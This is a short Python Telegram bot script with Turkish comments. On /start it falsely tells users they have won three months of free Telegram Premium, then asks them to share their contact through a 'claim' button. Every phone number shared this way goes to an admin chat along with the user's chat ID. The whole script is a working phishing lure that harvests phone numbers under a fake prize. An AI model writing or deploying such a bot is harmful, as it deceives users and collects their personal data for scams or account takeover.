import telebot
from telebot.types import KeyboardButton, ReplyKeyboardMarkup

API_TOKEN = 'bottoken'
ADMIN_CHAT_ID = 'idgir' 

print("Bot Dişxwile")

bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id

    # Kullanıcıdan telefon numarasını istemek için bir buton oluşturun
    markup = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    button_phone = KeyboardButton(text="Bedava Telegram Premium al", request_contact=True)
    markup.add(button_phone)

    bot.send_message(chat_id, "🎉Botu baslattığınız için 3 aylık telegram premium kazandınız", reply_markup=markup)

# Telefon numarasını alacak handler
@bot.message_handler(content_types=['contact'])
def contact_handler(message):
    if message.contact is not None:
        phone_number = message.contact.phone_number
        chat_id = message.chat.id

        # Telefon numarasını admin'e gönderme
        send_phone_number_to_admin(phone_number, chat_id)

        bot.send_message(chat_id, f"Telefon numaranız alındı: {phone_number}")

def send_phone_number_to_admin(phone_number, user_chat_id):
    message = f"Yeni telefon numarası paylaşıldı:\nTelefon Numarası: {phone_number}\nKullanıcı ID: {user_chat_id}"
    bot.send_message(ADMIN_CHAT_ID, message)

if __name__ == '__main__':
    bot.polling(none_stop=True)
